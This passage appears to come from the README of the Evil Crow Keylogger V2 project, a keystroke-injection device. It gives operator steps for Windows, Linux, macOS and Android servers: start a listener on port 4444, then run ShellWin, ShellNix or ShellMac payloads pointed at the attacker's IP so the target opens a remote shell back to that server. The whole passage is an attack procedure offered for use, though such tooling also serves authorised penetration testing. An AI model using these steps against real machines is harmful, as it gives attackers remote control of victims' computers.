	* MacOS Target: python evilcrow-server.py --port 4444 --target macos
	
![Server](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/server.png)

2. Go to the web panel and type the following payload from Live Payload:

	* Windows Target: ShellWin "Evil Crow server IP" (example: ShellWin 192.168.85.230)
	* Linux Target: ShellNix "Evil Crow server IP" (example: ShellNix 192.168.85.230)
	* MacOS Target: ShellMac "Evil Crow server IP" (example: ShellMac 192.168.85.230)
	
3. Click on 'Run Payload'.

## Windows Server

1. Run evilcrow-server.exe to start the attack:

	* Windows, Linux or MacOS Target: evilcrow-server.exe --port 4444

2. Go to the web panel and type the following payload from Live Payload:

	* Windows Target: ShellWin "Evil Crow server IP" (example: ShellWin 192.168.85.230)
	* Linux Target: ShellNix "Evil Crow server IP" (example: ShellNix 192.168.85.230)
	* MacOS Target: ShellMac "Evil Crow server IP" (example: ShellMac 192.168.85.230)
	
3. Click on 'Run Payload'.

![Server](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/server-windows.png)

## Android Server

1. Open Evil Crow Server APP

2. Go to the web panel and type the following payload from Live Payload:

	* Windows Target: ShellWin "Evil Crow server IP" (example: ShellWin 192.168.85.230)
	* Linux Target: ShellNix "Evil Crow server IP" (example: ShellNix 192.168.85.230)
	* MacOS Target: ShellMac "Evil Crow server IP" (example: ShellMac 192.168.85.230)

3. Click on 'Run Payload'.

![Server](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/server-android.jpg)


